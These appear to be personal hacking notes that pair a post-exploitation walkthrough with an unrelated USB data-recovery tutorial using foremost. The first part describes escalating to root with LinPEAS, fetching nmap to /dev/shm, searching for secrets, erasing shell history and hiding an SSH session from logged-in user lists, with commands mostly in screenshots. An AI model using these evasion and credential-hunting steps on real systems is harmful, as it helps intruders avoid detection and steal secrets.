
![[Pasted image 20250126210717.png]]


### Commands to check the basic system information:

-> ws


![[Pasted image 20250126211040.png]]

![[Pasted image 20250126210900.png]]

Now let's exit the shell and switch to that user:

![[Pasted image 20250126211147.png]]

	all commands we executed earlier are gone from the history

## Getting root

-> lpe

This will invoke **LinPEAS** which is the most popular tool for finding privilege Escalation  vulnerabilities:

![[Pasted image 20250126213553.png]]

## Fire up a network Scan:

_really usefull for finding online hosts quickly_

![[Pasted image 20250126213711.png]]

_in most scenarios there are tools not avaible on your target host like nmap, we can usually download it using the bin command:_

![[Pasted image 20250126231056.png]] 

which is downloaded to /dev/shm/ after that, you can confirm it with "which nmap"

![[Pasted image 20250126231210.png]]

See for perms:

![[Pasted image 20250126231314.png]]

![[Pasted image 20250126231332.png]]

Search for secrets:

![[Pasted image 20250126231423.png]]


## Silent SSH

when connecting to a remote machine via ssh, our connection will appear on the list **of remote users**


for demonstration, in the first pannel the attacker joins into ssh with the source ip specified:


While in the second pannel, by typing "w" we can see that we appear **connected from a remote host as a John**

![[Pasted image 20250126231736.png]]

In order to avoid this, we can use xssh command to hide us from that list:


![[Pasted image 20250126231958.png]]

	this time we no longer appear on the ssh list

---

# Usb data recovery — Digital forensics intro

Usb drive contains nothing but zeroes i copied some jpg images to usb

![](https://miro.medium.com/v2/resize:fit:627/1*m39g2zxIb9t0isVdZBEiTQ.png)

Usb drive contains jpg files

# Deleted files

While each filesystem handles deletion differently in technical implementation, the concept they utilize is the same. When you delete a file from the storage medium where your filesystem is located, the bits that your data is stored in are simply marked as "unused".  
Deletion by the definition of the word tends to imply an "overwriting" or "zeroing" procedure.


Now we know deleting data actually not deletes it.

I deleted the jpg files from usb drive

![](https://miro.medium.com/v2/resize:fit:627/1*oDE2Yf-86I-GWErjmzcKWQ.png)

Warning for deletion

![](https://miro.medium.com/v2/resize:fit:305/1*TSHv_l-g03rNH6Xhw0coTg.png)

Empty trash

We can now run our recovery tool to scrape out as many files as we can from the free (i.e. deleted) space of our device. The tool we are going to use is called Foremost. It i s a very simple to use tool that was originally created by the U.S. Air Force and later made open source and public. It has the ability to recover a few common filetypes automatically.  
These types include images, executables, documents, movies, etc. It supports ext3, fat, and ntfs filesystems, so chances are that your device will be supported. On a Debian system it was just a matter of running the following command to install foremost.

sudo apt install foremost  

![](https://miro.medium.com/v2/resize:fit:399/1*5W9m7r2VHj3N6MCbBHdhSQ.png)



![](https://miro.medium.com/v2/resize:fit:627/1*lYqjO_qMFr9LdBIBeLWZNg.png)

# Process

Need to find the path of the usb drive so you can use more than one way.

To find out if usb is mounted you can check it by

> lsusb  

![](https://miro.medium.com/v2/resize:fit:600/1*WLJ_vMZK--pFNseKFgwLaw.png)

							Lsusb

No we need to find out our path to usb for that we can use

> lsblk  

Or

> sudo fdisk -l  

![](https://miro.medium.com/v2/resize:fit:600/1*APGk9b42N41ta2feXmJv1w.png)

							Lsblk

![](https://miro.medium.com/v2/resize:fit:440/1*wD4laNPO2SmPn1MJV30zDw.png)

					Fdisk

My path to drive was

> /dev/sdb  

I confirmed it by looking at it’s size you can also check it by plugging and unplugging usb and entering these command will help you find your path

We are now ready to recover our files. If you know the specific type of file you wish to recover you can save time by telling Foremost

```
sudo foremost -T -t {fileType or all for all types} -i {drive} -o {outputFolder} -q  
```

![](https://miro.medium.com/v2/resize:fit:600/1*vs5y1sGcU_gt63Jyr-xd-w.png)

						Foremost running

It will take some time to complete after completion it will create a folder named recovery

![](https://miro.medium.com/v2/resize:fit:627/1*VZdMx05swX9YhuluZNnIaw.png)

						Finished

Once it has finished you will have hopefully recovered the data you were looking for to the recovery folder you specified. There is however one more hurdle to jump before you can find out. Foremost (like most of the tools we’ve used so far) **can only operate as root**. As such the output files **it generated are also owned by root.** To fix this we' ll chown them to our user.

```
sudo chown -R username:username {folder path}  
```

![](https://miro.medium.com/v2/resize:fit:627/1*PruVOA3z5sn33h18w2ffCw.png)

![](https://miro.medium.com/v2/resize:fit:627/1*jJgSs2Sjhrg6QauqplK97A.png)


It will conclude it’s findings on audit.txt and creates and arranges each filetype in different folders

Foremost successfully recovered the images

![](https://miro.medium.com/v2/resize:fit:472/1*E1cblUuw6hSb1iQLQU_Jew.png)

				Result

![](https://miro.medium.com/v2/resize:fit:482/1*nSiDz7zK-mTP7M6yOJvOWw.png)


![](https://miro.medium.com/v2/resize:fit:627/1*BZiaPphaximpkV5SThTgBg.png)

								Gui


---


https://medium.com/@samuel.i.steers/gmail-osint-another-useful-tool-449cc92434e8